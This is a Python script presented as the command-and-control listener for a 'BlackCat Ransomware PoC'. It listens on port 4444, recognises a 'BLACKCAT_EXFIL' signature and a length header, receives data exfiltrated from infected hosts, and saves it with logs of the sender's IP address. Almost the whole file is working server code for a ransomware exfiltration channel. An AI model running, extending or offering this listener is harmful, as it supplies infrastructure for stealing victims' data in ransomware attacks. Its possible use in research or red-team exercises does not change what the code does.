#!/usr/bin/env python3
"""
Simple C2 Listener for BlackCat Ransomware PoC
Just receives and saves encrypted data files
"""

import socket
import struct
from datetime import datetime
import os

def simple_c2_listener():
    HOST = '0.0.0.0'  # Listen on all interfaces
    PORT = 4444       # Default port
    
    print("=" * 60)
    print("BLACKCAT C2 LISTENER")
    print(f"Listening on port {PORT}")
    print(f"Data will be saved to current directory")
    print("Press Ctrl+C to stop")
    print("=" * 60)
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen(5)
        
        print(f"[*] Server started on {HOST}:{PORT}")
        
        while True:
            conn, addr = s.accept()
            print(f"\n[+] Connection from {addr[0]}:{addr[1]}")
            
            try:
                conn.settimeout(30)
                
                # Try to receive signature first
                try:
                    signature = conn.recv(19)
                    if signature.startswith(b'BLACKCAT_EXFIL'):
                        print(f"[*] BlackCat signature detected")
                        # Next 4 bytes should be size
                        size_data = conn.recv(4)
                        if len(size_data) == 4:
                            data_size = struct.unpack('>I', size_data)[0]
                        else:
                            # Fallback: just receive until connection closes
                            data_size = 0
                    else:
                        # Not our signature, but maybe it's the size?
                        data_size = 0
                except:
                    data_size = 0
                
                # Receive data
                received_data = b''
                
                if data_size > 0:
                    print(f"[*] Expecting {data_size} bytes")
                    bytes_received = 0
                    
                    while bytes_received < data_size:
                        chunk = conn.recv(min(4096, data_size - bytes_received))
                        if not chunk:
                            break
                        received_data += chunk
                        bytes_received += len(chunk)
                        
                        progress = (bytes_received / data_size) * 100
                        print(f"[*] Progress: {progress:.1f}%", end='\r')
                else:
                    # Receive until connection closes (for fallback)
                    print("[*] Receiving data...")
                    while True:
                        chunk = conn.recv(4096)
                        if not chunk:
                            break
                        received_data += chunk
                
                print()  # New line after progress
                
                if received_data:
                    # Generate filename with timestamp
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    ip_part = addr[0].replace('.', '_')
                    filename = f"blackcat_exfil_{ip_part}_{timestamp}.enc"
                    
                    # Save encrypted data
                    with open(filename, 'wb') as f:
                        f.write(received_data)
                    
                    print(f"[+] Saved {len(received_data)} bytes to {filename}")
                    
                    # Simple analysis of what we received
                    print("[*] First 50 bytes (hex):", received_data[:50].hex())
                    print("[*] File type analysis:")
                    
                    if len(received_data) >= 12:
                        print(f"  - First 12 bytes (nonce?): {received_data[:12].hex()}")
                    
                    if b'BLACKCAT' in received_data[:100]:
                        print("  - Contains 'BLACKCAT' marker")
                    
                    # Save a simple log
                    log_filename = f"exfil_log_{timestamp}.txt"
                    with open(log_filename, 'a') as log_file:
                        log_file.write(f"{datetime.now()} - From: {addr[0]}\n")
                        log_file.write(f"  File: {filename}, Size: {len(received_data)} bytes\n")
                        log_file.write(f"  First 32 bytes: {received_data[:32].hex()}\n\n")
                    
                    print(f"[*] Log saved to {log_filename}")
                    
                else:
                    print("[-] No data received")
                    
            except socket.timeout:
                print("[-] Connection timeout")
            except Exception as e:
                print(f"[-] Error: {e}")
            finally:
                conn.close()

if __name__ == "__main__":
    print("""
    ██████╗ ██╗      █████╗  ██████╗██╗  ██╗ ██████╗ █████╗ ████████╗
    ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗╚══██╔══╝
    ██████╔╝██║     ███████║██║     █████╔╝ ██║     ███████║   ██║   
    ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██║     ██╔══██║   ██║   
    ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗╚██████╗██║  ██║   ██║   
    ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝   
    
    C2 Server for BlackCat Ransomware PoC
    """)
    
    try:
        simple_c2_listener()
    except KeyboardInterrupt:
        print("\n\n[*] Server stopped by user")